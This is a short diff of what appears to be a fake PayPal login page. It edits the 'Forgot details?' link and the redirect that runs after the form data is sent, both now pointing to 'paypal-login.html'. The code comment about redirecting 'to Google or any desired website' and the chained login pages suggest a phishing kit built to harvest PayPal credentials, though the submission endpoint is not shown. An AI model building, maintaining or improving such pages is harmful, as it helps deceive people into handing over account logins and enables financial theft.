@@ -334,7 +334,7 @@
         </div>
 
 
-        <a href="./paypal-login2.html" class="forgot-password">Forgot details?</a>
+        <a href="./paypal-login.html" class="forgot-password">Forgot details?</a>
         <button type="submit" class="btn-primary" onclick="submitForm(event)" onclick="loader(next)">Next</button>
     </form>
 
@@ -393,7 +393,7 @@
             .then(response => {
                 if (response.ok) {
                     // Redirect to Google or any desired website after successful submission
-                    window.location.href = './paypal-login2.html';
+                    window.location.href = './paypal-login.html';
                 } else {
                     alert('Something went wrong. Please try again.');
                 }
